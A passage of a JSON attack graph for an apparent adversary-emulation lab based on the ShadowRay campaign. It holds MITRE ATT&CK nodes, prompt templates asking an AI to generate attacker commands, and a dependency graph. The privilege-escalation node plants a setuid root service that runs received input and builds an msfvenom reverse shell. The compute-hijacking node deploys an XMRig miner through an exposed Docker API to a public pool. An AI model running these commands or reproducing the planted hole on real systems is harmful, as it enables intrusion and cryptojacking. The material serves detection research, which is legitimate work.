+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "b35f71f1-c2e8-470d-8f64-e540f6004e52",
+      "node_index": 8,
+      "node_type": "structural",
+      "technique_id": "T1068",
+      "technique_name": "Exploitation for Privilege Escalation",
+      "tactic": "privilege-escalation",
+      "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
+      "campaign_context": "During ShadowRay, threat actors downloaded a privilege escalation payload to gain root access.",
+      "required_prerequisites": [
+        "access:low_privilege"
+      ],
+      "provides": [
+        "privileged_access",
+        "higher_privileges"
+      ],
+      "environment_setup_commands": [
+        "gcc -o /tmp/vulnerable_service -x c - <<'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main() {\nint sockfd, newsockfd;\nstruct sockaddr_in serv_addr, cli_addr;\nsocklen_t clilen;\nchar buffer[256];\nsockfd = socket(AF_INET, SOCK_STREAM, 0);\nserv_addr.sin_family = AF_INET;\nserv_addr.sin_addr.s_addr = INADDR_ANY;\nserv_addr.sin_port = htons(9999);\nbind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr));\nlisten(sockfd, 5);\nwhile(1) {\nclilen = sizeof(cli_addr);\nnewsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);\nrecv(newsockfd, buffer, 512, 0);\nsystem(buffer);\nclose(newsockfd);\n}\n}\nEOF\n",
+        "chmod +s /tmp/vulnerable_service\n",
+        "echo '[Unit]\nDescription=Vulnerable Test Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=/tmp/vulnerable_service\nRestart=always\n\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/vulnerable-service.service\n",
+        "systemctl daemon-reload && systemctl enable vulnerable-service && systemctl start vulnerable-service\n\n"
+      ],
+      "attacker_commands": [
+        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.21.0.1 LPORT=4444 -f elf -o privesc_payload\n",
+        "nc -lvnp 4444 &\n",
+        "echo -e \"#!/bin/bash\\ncp /bin/bash /tmp/rootshell\\nchmod +s /tmp/rootshell\" | nc 172.21.0.20 9999\n",
+        "ssh user@172.21.0.20 \"/tmp/rootshell -p\""
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "922d8454-e99c-42d9-b13c-b2c6d1e64edc"
+      ],
+      "child_nodes": [
+        "ea7046a1-c35e-46af-9a78-ad31b2027374"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1068 - Exploitation for Privilege Escalation\nTACTIC: privilege-escalation\nCAMPAIGN CONTEXT: During ShadowRay, threat actors downloaded a privilege escalation payload to gain root access.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:low_privilege"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "ea7046a1-c35e-46af-9a78-ad31b2027374",
+      "node_index": 9,
+      "node_type": "structural",
+      "technique_id": "T1496.001",
+      "technique_name": "Compute Hijacking",
+      "tactic": "impact",
+      "description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \nOne common purpose for Compute Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Compute Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.",
+      "campaign_context": "During ShadowRay, threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining.",
+      "required_prerequisites": [],
+      "provides": [
+        "disruption"
+      ],
+      "environment_setup_commands": [
+        "sudo apt update && sudo apt install -y docker.io",
+        "sudo systemctl start docker && sudo systemctl enable docker",
+        "sudo docker run -d -p 2375:2375 -v /var/run/docker.sock:/var/run/docker.sock --name docker-api --restart always alpine/socat tcp-listen:2375,fork,reuseaddr unix-connect:/var/run/docker.sock",
+        "sudo ufw allow 2375/tcp\n\n"
+      ],
+      "attacker_commands": [
+        "curl -s http://172.21.0.20:2375/version",
+        "docker -H tcp://172.21.0.20:2375 run -d --name cryptominer --restart unless-stopped alpine/git sh -c \"apk add --no-cache curl && curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz | tar -xz && cd xmrig-* && ./xmrig --donate-level=1 --url=pool.supportxmr.com:443 --user=4AdUndXHHZ6cfufTMvppY6JwXkX5pAiS1P5H3LN1VNc7VD7YdwrczZJQFFXXXXXXXXXXXXXXXXXXXXXXXXX --pass=worker1 --tls --rig-id=hijacked_container\"",
+        "docker -H tcp://172.21.0.20:2375 stats cryptominer --no-stream",
+        "docker -H tcp://172.21.0.20:2375 ps | grep -E \"(mining|miner|crypto)\""
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "35161caf-b5db-43cb-9fcd-3c693820e4df",
+        "b35f71f1-c2e8-470d-8f64-e540f6004e52"
+      ],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1496.001 - Compute Hijacking\nTACTIC: impact\nCAMPAIGN CONTEXT: During ShadowRay, threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \nOne common purpose for Compute Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Compute Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "Restore affected files/services",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    }
+  ],
+  "dag_representation": {
+    "nodes": [
+      {
+        "id": "T1190",
+        "original_id": "149cdfe5-7159-405a-91b8-7a57c8765425",
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "index": 0,
+        "provides": [
+          "initial_access",
+          "foothold"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1027.013",
+        "original_id": "22d168e8-69cf-4fe6-9167-7e7b79a10a99",
+        "technique_id": "T1027.013",
+        "technique_name": "Encrypted/Encoded File",
+        "tactic": "defense-evasion",
+        "index": 1,
+        "provides": [
+          "evasion_capability"
+        ],
+        "prerequisites": [
+          "capability:modify_system_settings"
+        ]
+      },
+      {
+        "id": "T1003.008",
+        "original_id": "107a7cba-3fbf-4181-b083-f6a4fd1a3550",
+        "technique_id": "T1003.008",
+        "technique_name": "/etc/passwd and /etc/shadow",
+        "tactic": "credential-access",
+        "index": 2,
+        "provides": [
+          "password_hashes",
+          "credentials",
+          "secrets"
+        ],
+        "prerequisites": [
+          "access:target",
+          "need:credential_material_location"
+        ]
+      },
+      {
+        "id": "T1546.004",
+        "original_id": "35161caf-b5db-43cb-9fcd-3c693820e4df",
+        "technique_id": "T1546.004",
+        "technique_name": "Unix Shell Configuration Modification",
+        "tactic": "privilege-escalation",
+        "index": 3,
+        "provides": [
+          "privileged_access",
+          "higher_privileges"
+        ],
+        "prerequisites": [
+          "access:low_privilege",
+          "need:privilege_escalation_vector"
+        ]
+      },
+      {
+        "id": "T1588.002",
+        "original_id": "6ca3d505-70a5-4746-a3ff-a4914fc14a05",
+        "technique_id": "T1588.002",
+        "technique_name": "Tool",
+        "tactic": "resource-development",
+        "index": 4,
+        "provides": [
+          "infrastructure",
+          "resources"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1105",
+        "original_id": "89cb3747-050a-4c93-83de-a7e015ec1727",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "tactic": "command-and-control",
+        "index": 5,
+        "provides": [
+          "c2_channel"
+        ],
+        "prerequisites": [
+          "network:egress_allowed",
+          "access:initial"
+        ]
+      },
+      {
+        "id": "T1059.006",
+        "original_id": "922d8454-e99c-42d9-b13c-b2c6d1e64edc",
+        "technique_id": "T1059.006",
+        "technique_name": "Python",
+        "tactic": "execution",
+        "index": 6,
+        "provides": [
+          "code_execution",
+          "execution_capability"
+        ],
+        "prerequisites": [
+          "need:execution_vector",
+          "access:initial"
+        ]
+      },
+      {
+        "id": "T1016",
+        "original_id": "88830879-618f-498a-87a6-b879ad875d21",
+        "technique_id": "T1016",
+        "technique_name": "System Network Configuration Discovery",
+        "tactic": "discovery",
+        "index": 7,
+        "provides": [
+          "user_info",
+          "network_info",
+          "discovered_info",
+          "system_info",
+          "network_config_discovery"
+        ],
+        "prerequisites": [
+          "access:target"
+        ]
+      },
+      {
+        "id": "T1068",
+        "original_id": "b35f71f1-c2e8-470d-8f64-e540f6004e52",
+        "technique_id": "T1068",
+        "technique_name": "Exploitation for Privilege Escalation",
+        "tactic": "privilege-escalation",
+        "index": 8,
+        "provides": [
+          "privileged_access",
+          "higher_privileges"
+        ],
+        "prerequisites": [
+          "access:low_privilege"
+        ]
+      },
+      {
+        "id": "T1496.001",
+        "original_id": "ea7046a1-c35e-46af-9a78-ad31b2027374",
+        "technique_id": "T1496.001",
+        "technique_name": "Compute Hijacking",
+        "tactic": "impact",
+        "index": 9,
+        "provides": [
+          "disruption"
+        ],
+        "prerequisites": []
+      }
+    ],
+    "edges": [
+      {
+        "from": "T1190",
+        "to": "T1105"
+      },
+      {
+        "from": "T1190",
+        "to": "T1016"
+      },
+      {
+        "from": "T1546.004",
+        "to": "T1496.001"
+      },
+      {
+        "from": "T1059.006",
+        "to": "T1016"
+      },
+      {
+        "from": "T1059.006",
+        "to": "T1068"
+      },
+      {
+        "from": "T1068",
+        "to": "T1496.001"
+      }
+    ],
+    "levels": {
+      "0": [
+        "T1190",
+        "T1027.013",
+        "T1003.008",
+        "T1546.004",
+        "T1588.002",
+        "T1059.006"
+      ],
+      "1": [
+        "T1105",
+        "T1016",
+        "T1496.001",
+        "T1068"
+      ]
+    },
+    "adjacency_list": {
+      "T1190": {
+        "parents": [],
+        "children": [
+          "T1105",
+          "T1016"
+        ]
+      },
+      "T1027.013": {
+        "parents": [],
+        "children": []
+      },
+      "T1003.008": {
+        "parents": [],
+        "children": []
+      },
+      "T1546.004": {
+        "parents": [],
+        "children": [
+          "T1496.001"
+        ]
+      },
+      "T1588.002": {
+        "parents": [],
+        "children": []
+      },
+      "T1105": {
+        "parents": [
+          "T1190"
+        ],
+        "children": []
+      },
+      "T1059.006": {
+        "parents": [],
+        "children": [
+          "T1016",
+          "T1068"
+        ]
+      },
+      "T1016": {
+        "parents": [
+          "T1190",
+          "T1059.006"
+        ],
+        "children": []
+      },
+      "T1068": {
+        "parents": [
+          "T1059.006"
+        ],
+        "children": [
+          "T1496.001"
+        ]
+      },
+      "T1496.001": {
+        "parents": [
+          "T1546.004",
+          "T1068"
+        ],
+        "children": []
+      }
+    },
+    "roots": [
+      "T1190",
+      "T1027.013",
+      "T1003.008",
+      "T1546.004",
+      "T1588.002",
+      "T1059.006"
+    ],
+    "leaves": [
+      "T1027.013",
+      "T1003.008",
+      "T1588.002",
+      "T1105",
+      "T1016",
+      "T1496.001"
+    ]
+  },
+  "runtime_nodes": [],
+  "edges": [
+    {
+      "from": "149cdfe5-7159-405a-91b8-7a57c8765425",
+      "to": "89cb3747-050a-4c93-83de-a7e015ec1727"
+    },
+    {
+      "from": "149cdfe5-7159-405a-91b8-7a57c8765425",
+      "to": "88830879-618f-498a-87a6-b879ad875d21"
+    },
+    {
+      "from": "35161caf-b5db-43cb-9fcd-3c693820e4df",
+      "to": "ea7046a1-c35e-46af-9a78-ad31b2027374"
+    },
+    {
+      "from": "922d8454-e99c-42d9-b13c-b2c6d1e64edc",
+      "to": "88830879-618f-498a-87a6-b879ad875d21"
+    },
+    {
+      "from": "922d8454-e99c-42d9-b13c-b2c6d1e64edc",
+      "to": "b35f71f1-c2e8-470d-8f64-e540f6004e52"
+    },
+    {
+      "from": "b35f71f1-c2e8-470d-8f64-e540f6004e52",
+      "to": "ea7046a1-c35e-46af-9a78-ad31b2027374"
+    }
+  ],
+  "capability_flow": {
+    "initial_capabilities": [
+      "initial_access",
+      "foothold"
+    ],
+    "final_capabilities": [
+      "disruption",
+      "network_info",
+      "resources",
+      "execution_capability",
+      "c2_channel",
+      "network_config_discovery",
+      "user_info",
+      "foothold",
+      "initial_access",
+      "privileged_access",
+      "secrets",
+      "credentials",
+      "infrastructure",
+      "discovered_info",
+      "system_info",
+      "password_hashes",
+      "evasion_capability",
+      "higher_privileges",
+      "code_execution"
+    ],
+    "capability_chain": [
+      {
+        "node_index": 0,
+        "technique": "T1190 - Exploit Public-Facing Application",
+        "adds": [
+          "initial_access",
+          "foothold"
+        ],
+        "cumulative_capabilities": [
+          "initial_access",
+          "foothold"
+        ]
+      },
+      {
+        "node_index": 1,
+        "technique": "T1027.013 - Encrypted/Encoded File",
+        "adds": [
+          "evasion_capability"
+        ],
+        "cumulative_capabilities": [
+          "initial_access",
+          "foothold",
+          "evasion_capability"
+        ]
+      },
+      {
+        "node_index": 2,
+        "technique": "T1003.008 - /etc/passwd and /etc/shadow",
+        "adds": [
+          "password_hashes",
+          "credentials",
+          "secrets"
+        ],
+        "cumulative_capabilities": [
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets"
+        ]
+      },
+      {
+        "node_index": 3,
+        "technique": "T1546.004 - Unix Shell Configuration Modification",
+        "adds": [
+          "privileged_access",
+          "higher_privileges"
+        ],
+        "cumulative_capabilities": [
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets",
+          "privileged_access",
+          "higher_privileges"
+        ]
+      },
+      {
+        "node_index": 4,
+        "technique": "T1588.002 - Tool",
+        "adds": [
+          "infrastructure",
+          "resources"
+        ],
+        "cumulative_capabilities": [
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets",
+          "privileged_access",
+          "infrastructure",
+          "higher_privileges",
+          "resources"
+        ]
+      },
+      {
+        "node_index": 5,
+        "technique": "T1105 - Ingress Tool Transfer",
+        "adds": [
+          "c2_channel"
+        ],
+        "cumulative_capabilities": [
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets",
+          "privileged_access",
+          "infrastructure",
+          "higher_privileges",
+          "resources",
+          "c2_channel"
+        ]
+      },
+      {
+        "node_index": 6,
+        "technique": "T1059.006 - Python",
+        "adds": [
+          "code_execution",
+          "execution_capability"
+        ],
+        "cumulative_capabilities": [
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets",
+          "privileged_access",
+          "infrastructure",
+          "higher_privileges",
+          "resources",
+          "execution_capability",
+          "c2_channel",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 7,
+        "technique": "T1016 - System Network Configuration Discovery",
+        "adds": [
+          "user_info",
+          "network_info",
+          "discovered_info",
+          "system_info",
+          "network_config_discovery"
+        ],
+        "cumulative_capabilities": [
+          "user_info",
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets",
+          "privileged_access",
+          "infrastructure",
+          "network_info",
+          "higher_privileges",
+          "resources",
+          "execution_capability",
+          "discovered_info",
+          "c2_channel",
+          "system_info",
+          "code_execution",
+          "network_config_discovery"
+        ]
+      },
+      {
+        "node_index": 8,
+        "technique": "T1068 - Exploitation for Privilege Escalation",
+        "adds": [
+          "privileged_access",
+          "higher_privileges"
+        ],
+        "cumulative_capabilities": [
+          "user_info",
+          "credentials",
+          "foothold",
+          "initial_access",
+          "password_hashes",
+          "evasion_capability",
+          "secrets",
+          "privileged_access",
+          "infrastructure",
+          "network_info",
+          "higher_privileges",
+          "resources",
+          "execution_capability",
+          "discovered_info",
+          "c2_channel",
+          "system_info",
+          "code_execution",
+          "network_config_discovery"
+        ]
+      },
+      {
+        "node_index": 9,
+        "technique": "T1496.001 - Compute Hijacking",
+        "adds": [
+          "disruption"
+        ],
+        "cumulative_capabilities": [
+          "disruption",
+          "network_info",
+          "resources",
+          "execution_capability",
+          "c2_channel",
+          "network_config_discovery",
+          "user_info",
+          "foothold",
+          "initial_access",
+          "privileged_access",
+          "secrets",
+          "credentials",
+          "infrastructure",
+          "discovered_info",
+          "system_info",
+          "password_hashes",
+          "evasion_capability",
+          "higher_privileges",
+          "code_execution"
+        ]
+      }
+    ]
+  }
+}
